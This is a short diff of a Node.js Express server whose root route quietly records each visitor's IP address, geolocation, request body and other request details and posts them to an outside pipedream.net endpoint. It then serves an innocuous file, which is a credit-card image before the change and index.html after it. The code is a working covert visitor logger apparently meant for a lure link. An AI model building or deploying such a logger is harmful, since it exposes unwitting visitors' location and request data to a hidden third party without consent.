@@ -10,12 +10,9 @@ const instance = axios.create({
 })
 
 app.get("/", (req, res) => {
-
     console.log(`REQUEST`, req)
-
     const clientIp = requestIp.getClientIp(req); 
     const location = geoip.lookup(clientIp);
-
     instance.post('https://eo2y2cjch3zlyga.m.pipedream.net/', {
         data: {
             timestamp: new Date().toISOString(),
@@ -30,7 +27,7 @@ app.get("/", (req, res) => {
             body: req.body, // If body parser is used for post data
         }
     }).then((response) => {
-        res.sendFile(__dirname + '/public/cartao-de-credito.png');
+        res.sendFile(__dirname + '/public/index.html');
     })    
 });
 
